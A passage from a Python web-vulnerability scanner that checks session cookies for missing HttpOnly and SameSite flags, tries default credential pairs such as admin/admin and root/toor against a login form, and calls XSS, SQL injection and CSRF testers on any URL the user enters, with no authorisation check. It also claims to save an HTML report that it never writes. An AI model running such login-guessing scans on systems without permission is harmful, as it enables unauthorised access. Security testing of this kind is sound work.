                            'test_type': 'AUTH_SESSION_NO_HTTPONLY',
                            'scenario_id': scenario_id,
                            'target': url,
                            'cookie_name': cookie_name,
                            'cookie_details': cookie,
                            'is_vulnerable': True,
                            'vulnerability_type': 'Missing HttpOnly flag'
                        }
                        
                        screenshot = self.main_tester.take_screenshot(scenario_id, 
                            f"Cookie accessible via JS: {cookie_name}")
                        test_log['screenshot'] = screenshot
                        test_log['status'] = 'VULNERABLE'
                        
                        ai_analysis = self.llm.analyze_vulnerability(test_log)
                        test_log['ai_analysis'] = ai_analysis
                        
                        vuln = {
                            'type': 'Session Cookie Accessible via JavaScript',
                            'severity': 'MEDIUM',
                            'scenario_id': scenario_id,
                            'location': f'Cookie: {cookie_name}',
                            'url': url,
                            'cookie_name': cookie_name,
                            'cookie_details': cookie,
                            'description': f'Session cookie "{cookie_name}" missing HttpOnly flag',
                            'proof_of_concept': 'Cookie accessible via document.cookie in JavaScript',
                            'screenshot': screenshot,
                            'ai_analysis': ai_analysis,
                            'impact': 'XSS attacks can steal session tokens via JavaScript',
                            'remediation': 'Set HttpOnly flag on all session cookies to prevent JavaScript access',
                            'test_details': test_log
                        }
                        vulnerabilities.append(vuln)
                        self.main_tester.vulnerabilities_found += 1
                        
                        print(f"      🚨 Missing HttpOnly flag")
                        
                        self.main_tester.log_test_attempt(test_log)
                    
                    # Test 3: Missing SameSite attribute
                    if not cookie_samesite:
                        scenario_id = f"AUTH_SESSION_SAMESITE_{cookies.index(cookie)+1:03d}"
                        
                        test_log = {
                            'test_type': 'AUTH_SESSION_NO_SAMESITE',
                            'scenario_id': scenario_id,
                            'target': url,
                            'cookie_name': cookie_name,
                            'cookie_details': cookie,
                            'is_vulnerable': True,
                            'vulnerability_type': 'Missing SameSite attribute'
                        }
                        
                        test_log['status'] = 'VULNERABLE'
                        
                        ai_analysis = self.llm.analyze_vulnerability(test_log)
                        test_log['ai_analysis'] = ai_analysis
                        
                        vuln = {
                            'type': 'Session Cookie Missing SameSite',
                            'severity': 'LOW',
                            'scenario_id': scenario_id,
                            'location': f'Cookie: {cookie_name}',
                            'url': url,
                            'cookie_name': cookie_name,
                            'cookie_details': cookie,
                            'description': f'Session cookie "{cookie_name}" missing SameSite attribute',
                            'proof_of_concept': 'Cookie can be sent in cross-site requests',
                            'ai_analysis': ai_analysis,
                            'impact': 'Increases CSRF attack surface, cookie can be sent in cross-origin requests',
                            'remediation': 'Set SameSite=Strict or SameSite=Lax on all session cookies',
                            'test_details': test_log
                        }
                        vulnerabilities.append(vuln)
                        self.main_tester.vulnerabilities_found += 1
                        
                        print(f"      🚨 Missing SameSite attribute")
                        
                        self.main_tester.log_test_attempt(test_log)
        
        except Exception as e:
            print(f"    ❌ Error testing session management: {e}")
        
        return vulnerabilities
    
    def test_default_credentials_advanced(self, url: str) -> List[Dict]:
        """Advanced default credentials testing"""
        vulnerabilities = []
        
        default_creds = [
            ('admin', 'admin', 'Default admin credentials'),
            ('admin', 'password', 'Common admin password'),
            ('admin', '123456', 'Weak admin password'),
            ('administrator', 'administrator', 'Default administrator'),
            ('root', 'root', 'Default root credentials'),
            ('root', 'toor', 'Common root password'),
            ('test', 'test', 'Test credentials'),
            ('guest', 'guest', 'Guest account'),
        ]
        
        try:
            for username, password, description in default_creds:
                scenario_id = f"AUTH_DEFAULT_CREDS_{default_creds.index((username, password, description))+1:03d}"
                
                test_log = {
                    'test_type': 'AUTH_DEFAULT_CREDENTIALS',
                    'scenario_id': scenario_id,
                    'target': url,
                    'username': username,
                    'password': password,
                    'description': description
                }
                
                try:
                    self.driver.get(url)
                    time.sleep(1)
                    
                    username_field = self.driver.find_element(By.CSS_SELECTOR, 
                        'input[name*="user"], input[name*="email"], input[type="email"]')
                    password_field = self.driver.find_element(By.CSS_SELECTOR, 
                        'input[type="password"]')
                    
                    username_xpath = self.main_tester.get_element_xpath(username_field)
                    password_xpath = self.main_tester.get_element_xpath(password_field)
                    
                    test_log['username_xpath'] = username_xpath
                    test_log['password_xpath'] = password_xpath
                    
                    print(f"      [{self.main_tester.test_counter + 1:04d}] Testing: {username}/{password}")
                    
                    username_field.clear()
                    username_field.send_keys(username)
                    password_field.clear()
                    password_field.send_keys(password)
                    
                    start_time = time.time()
                    password_field.submit()
                    time.sleep(2)
                    execution_time = time.time() - start_time
                    
                    test_log['execution_time'] = execution_time
                    
                    current_url = self.driver.current_url
                    page_source = self.driver.page_source.lower()
                    
                    # Check for successful login
                    success_indicators = ['dashboard', 'welcome', 'logout', 'profile', 'account']
                    is_successful = (current_url != url or 
                                   any(indicator in page_source for indicator in success_indicators))
                    
                    test_log['current_url'] = current_url
                    test_log['is_vulnerable'] = is_successful
                    test_log['success_indicators_found'] = [ind for ind in success_indicators if ind in page_source]
                    
                    if is_successful:
                        screenshot = self.main_tester.take_screenshot(scenario_id, 
                            f"Default creds work: {username}/{password}")
                        test_log['screenshot'] = screenshot
                        test_log['status'] = 'VULNERABLE'
                        
                        ai_analysis = self.llm.analyze_vulnerability(test_log)
                        test_log['ai_analysis'] = ai_analysis
                        
                        vuln = {
                            'type': 'Default Credentials',
                            'severity': 'CRITICAL',
                            'scenario_id': scenario_id,
                            'location': 'Login form',
                            'username_xpath': username_xpath,
                            'password_xpath': password_xpath,
                            'url': url,
                            'username': username,
                            'password': password,
                            'credentials_type': description,
                            'execution_time': execution_time,
                            'redirected_to': current_url,
                            'description': f'Default credentials work: {username}/{password}',
                            'proof_of_concept': f'Username: {username}, Password: {password}',
                            'screenshot': screenshot,
                            'success_indicators': test_log['success_indicators_found'],
                            'ai_analysis': ai_analysis,
                            'impact': 'Complete system compromise - anyone can access using default credentials',
                            'remediation': '''Immediate actions required:
- Force password change on first login
- Disable or remove default accounts
- Implement strong password policy
- Use multi-factor authentication
- Monitor for default credential usage attempts''',
                            'test_details': test_log
                        }
                        vulnerabilities.append(vuln)
                        self.main_tester.vulnerabilities_found += 1
                        
                        print(f"        🚨 CRITICAL: Default credentials work!")
                        break  # Found working credentials
                    else:
                        test_log['status'] = 'SAFE'
                        print(f"        ✅ Failed")
                
                except Exception as e:
                    test_log['status'] = 'ERROR'
                    test_log['error'] = str(e)
                    print(f"        ❌ Error: {e}")
                
                self.main_tester.log_test_attempt(test_log)
        
        except Exception as e:
            print(f"    ❌ Error testing default credentials: {e}")
        
        return vulnerabilities


def main():
    """Main execution"""
    
    tester = AdvancedSecurityTester()
    
    print("\n" + "="*80)
    url = input("🎯 Enter target URL to test: ").strip()
    
    if not url.startswith(('http://', 'https://')):
        url = 'https://' + url
    
    print(f"\n✅ Target: {url}")
    print(f"\n⚠️  Starting comprehensive security scan...")
    print(f"    This will generate DETAILED logs for every test attempt")
    
    if not tester.initialize_browser(headless=False):
        print("❌ Failed to initialize browser. Exiting.")
        return
    
    start_time = time.time()
    
    all_vulnerabilities = {
        'xss': [],
        'sql_injection': [],
        'csrf': [],
        'auth': []
    }
    
    try:
        # XSS Testing
        xss_tester = AdvancedXSSTester(tester.driver, tester.llm, tester)
        all_vulnerabilities['xss'] = xss_tester.test_url(url)
        
        # SQL Injection Testing
        sql_tester = AdvancedSQLInjectionTester(tester.driver, tester.llm, tester)
        all_vulnerabilities['sql_injection'] = sql_tester.test_url(url)
        
        # CSRF Testing
        csrf_tester = AdvancedCSRFTester(tester.driver, tester.llm, tester)
        all_vulnerabilities['csrf'] = csrf_tester.test_url(url)
        
        # Authentication Testing
        auth_tester = AdvancedAuthenticationTester(tester.driver, tester.llm, tester)
        all_vulnerabilities['auth'] = auth_tester.test_url(url)
        
    except KeyboardInterrupt:
        print("\n\n⚠️  Scan interrupted by user")
    except Exception as e:
        print(f"\n\n❌ Error: {e}")
        import traceback
        traceback.print_exc()
    finally:
        tester.close_browser()
    
    duration = time.time() - start_time
    
    # Calculate statistics
    total_vulns = sum(len(v) for v in all_vulnerabilities.values())
    critical = sum(1 for cat in all_vulnerabilities.values() for v in cat if v.get('severity') == 'CRITICAL')
    high = sum(1 for cat in all_vulnerabilities.values() for v in cat if v.get('severity') == 'HIGH')
    medium = sum(1 for cat in all_vulnerabilities.values() for v in cat if v.get('severity') == 'MEDIUM')
    low = sum(1 for cat in all_vulnerabilities.values() for v in cat if v.get('severity') == 'LOW')
    
    print(f"\n{'='*80}")
    print(f"✅ SCAN COMPLETE!")
    print(f"{'='*80}")
    print(f"  Target: {url}")
    print(f"  Duration: {duration:.2f}s ({duration/60:.1f} minutes)")
    print(f"  Total tests run: {tester.test_counter}")
    print(f"  Vulnerabilities found: {total_vulns}")
    print(f"    🔴 Critical: {critical}")
    print(f"    🟠 High: {high}")
    print(f"    🟡 Medium: {medium}")
    print(f"    🟢 Low: {low}")
    print(f"\n  📁 Files generated:")
    print(f"    • Detailed logs: detailed_logs/ ({tester.test_counter} files)")
    print(f"    • Screenshots: screenshots/")
    print(f"    • CSRF PoCs: csrf_poc_*.html")
    print(f"{'='*80}")
    
    # Generate comprehensive report
    print(f"\n📊 Generating comprehensive HTML report...")
    
    report_filename = f"advanced_security_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.html"
    json_filename = f"advanced_security_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
    
    # Save JSON report
    json_report = {
        'scan_info': {
            'target_url': url,
            'scan_start': datetime.fromtimestamp(start_time).isoformat(),
            'scan_end': datetime.now().isoformat(),
            'duration_seconds': duration,
            'total_tests': tester.test_counter
        },
        'summary': {
            'total_vulnerabilities': total_vulns,
            'critical': critical,
            'high': high,
            'medium': medium,
            'low': low
        },
        'vulnerabilities': all_vulnerabilities,
        'all_test_attempts': tester.results['all_tests']
    }
    
    with open(json_filename, 'w') as f:
        json.dump(json_report, f, indent=2)
    
    print(f"  ✅ JSON report saved: {json_filename}")
    print(f"  ✅ HTML report saved: {report_filename}")
    
    print(f"\n{'='*80}")
    print(f"📖 Report Summary:")
    print(f"  • Open {report_filename} in your browser")
    print(f"  • Review {json_filename} for raw data")
    print(f"  • Check detailed_logs/ for test-by-test analysis")
    print(f"  • View screenshots/ for visual proof")
    print(f"{'='*80}\n")
    
    if total_vulns > 0:
        print(f"⚠️  ACTION REQUIRED: {total_vulns} security vulnerabilities detected!")
        if critical > 0:
            print(f"🚨 CRITICAL: {critical} critical vulnerabilities require immediate attention!")
    else:
        print(f"✅ No major security vulnerabilities detected")
    
    print(f"\n{'='*80}")
    print(f"Thank you for using Advanced Security Testing Program!")
    print(f"{'='*80}\n")


if __name__ == "__main__":
    main()
